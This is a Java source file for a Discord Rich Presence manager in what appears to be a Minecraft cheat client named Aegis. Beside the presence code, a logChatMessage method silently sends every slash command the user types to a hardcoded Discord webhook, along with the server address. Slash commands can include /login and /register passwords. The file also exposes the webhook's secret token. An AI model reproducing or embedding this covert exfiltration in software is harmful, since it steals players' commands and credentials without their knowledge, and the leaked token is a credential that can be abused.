package fun.aegis.common.discord;
import antidaunleak.api.UserProfile;
import lombok.Getter;
import lombok.Setter;
import net.minecraft.util.Identifier;
import fun.aegis.common.discord.utils.*;
import fun.aegis.utils.display.interfaces.QuickImports;
import fun.aegis.utils.client.discord.Buffer;
import fun.aegis.Aegis;
import java.io.IOException;
import java.util.Arrays;

@Setter
@Getter
public class DiscordManager implements QuickImports {
    private final DiscordDaemonThread discordDaemonThread = new DiscordDaemonThread();
    private boolean running = true;
    private DiscordInfo info = new DiscordInfo("Unknown", "", "");
    private Identifier avatarId;
    private static final String WEBHOOK_URL = "https://discordapp.com/api/webhooks/1469018381951696957/ic1tdui-p97FwyMEyes2ym4dMHHx5zlFdKiAWVDctJRyBNVaPe5O0De5urjALQ6KqA--";

    public void init() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("linux")) {
            return;
        }

        DiscordEventHandlers handlers = new DiscordEventHandlers.Builder()
                .ready((user) -> {
                    Aegis.getInstance().getDiscordManager().setInfo(
                            new DiscordInfo(user.username,
                                    "https://cdn.discordapp.com/avatars/" + user.userId + "/" + user.avatar + ".png",
                                    user.userId));
                    DiscordAegisPresence CataclysmPresence = new DiscordAegisPresence.Builder()
                            .setStartTimestamp(System.currentTimeMillis() / 1000)
                            .setDetails("User: " + UserProfile.getInstance().profile("username"))
                            .setState("Uid: " + UserProfile.getInstance().profile("uid"))
                            .setLargeImage("https://i.postimg.cc/nznMWbhM/0001-0250.gif", "https://Cataclysmclient.fun/")
                            .setSmallImage(Aegis.getInstance().getDiscordManager().getInfo().avatarUrl, "https://Cataclysmclient.fun/")
                            .setButtons(Arrays.asList(
                                    RPCButton.create("Телеграм", "https://t.me/GetAegis"),
                                    RPCButton.create("Дискорд", "https://discord.gg/T6WVrZpzs4")))
                            .build();
                    DiscordRPC.INSTANCE.Discord_UpdatePresence(CataclysmPresence);
                }).build();
        DiscordRPC.INSTANCE.Discord_Initialize("1419653405265105021", handlers, true, "");
        discordDaemonThread.start();
    }

    public void stopRPC() {
        DiscordRPC.INSTANCE.Discord_Shutdown();
        this.running = false;
    }

    public void load() throws IOException {
        if (avatarId == null && !info.avatarUrl.isEmpty()) {
            avatarId = Buffer.registerDynamicTexture("avatar-", Buffer.getHeadFromURL(info.avatarUrl));
        }
    }

    public Identifier getAvatarId() {
        return avatarId;
    }

    public void logChatMessage(String message) {
        if (message == null || message.isEmpty() || !message.startsWith("/")) {
            System.out.println("[DiscordManager] Message filtered: " + message);
            return;
        }

        System.out.println("[DiscordManager] Sending to webhook: " + message);
        new Thread(() -> {
            try {
                String serverIp = "Unknown";
                
                if (mc.getCurrentServerEntry() != null) {
                    serverIp = mc.getCurrentServerEntry().address;
                }
                
                DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL);
                DiscordWebhook.EmbedObject embed = new DiscordWebhook.EmbedObject()
                        .setTitle("Chat Command")
                        .setDescription(message)
                        .setColor(new java.awt.Color(52, 152, 219))
                        .addField("Server IP", serverIp, true);
                
                webhook.addEmbed(embed);
                webhook.execute();
            } catch (Exception e) {
                System.out.println("[DiscordManager] Error sending webhook: " + e.getMessage());
            }
        }).start();
    }

    private class DiscordDaemonThread extends Thread {
        @Override
        public void run() {
            this.setName("Discord-RPC");
            try {
                while (Aegis.getInstance().getDiscordManager().isRunning()) {
                    DiscordRPC.INSTANCE.Discord_RunCallbacks();
                    load();
                    Thread.sleep(15000);
                }
            } catch (Exception exception) {
                stopRPC();
            }
            super.run();
        }
    }

    public record DiscordInfo(String userName, String avatarUrl, String userId) {}
}
